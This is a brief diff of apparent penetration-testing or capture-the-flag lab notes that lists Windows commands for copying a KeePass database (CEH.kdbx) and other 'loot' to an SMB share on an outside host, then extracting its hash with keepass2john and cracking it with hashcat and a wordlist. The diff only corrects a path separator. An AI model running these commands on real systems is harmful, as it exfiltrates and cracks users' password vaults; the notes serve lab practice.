@@ -21,7 +21,7 @@ net view \10.10.14.3\
 powershell -c "New-PSDrive -Name 'hello' -PSProvider 'FileSystem' -Root '\10.10.14.3\hi'" [Did this do anything tho]
 
 copy .\CEH.kdbx \10.10.14.3\hi 
-PowerShell: Copy-Item C:\Users\bob\Desktop<LOOT> \<share><LOOT>
+PowerShell: Copy-Item C:\Users\bob\Desktop<LOOT> \<share>\<LOOT>
 
 keepass2john CEH.kdbx
 hashcat64.exe -m 13400 hash.txt rockyou.txt -d 1
